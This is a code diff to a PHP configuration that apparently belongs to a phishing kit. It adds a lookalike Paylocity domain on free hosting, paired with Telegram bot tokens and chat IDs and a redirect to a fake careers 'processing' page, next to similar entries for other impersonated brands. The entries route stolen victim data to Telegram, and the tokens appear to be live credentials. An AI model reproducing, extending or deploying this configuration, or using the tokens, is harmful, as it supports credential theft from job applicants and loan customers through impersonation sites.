@@ -14,6 +14,14 @@ $site_map = [
         ],
         'redirect' => 'https://paylocitylive.42web.io/cache_site/careers/all-listings.job.34092/processing.html'
     ],
+
+    'thepaylocity.rf.gd' => [
+        'bots' => [
+            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+            ['token' => '7603786731:AAEPbaOXWK9DGtTTH3ZXMoTueem5OSY8uBA', 'chat_id' => '8084520583']
+        ],
+        'redirect' => 'https://thepaylocity.rf.gd/cache_site/careers/all-listings.job.34092/processing.html'
+    ],
     
     'lendingpoint.ct.ws' => [
         'bots' => [
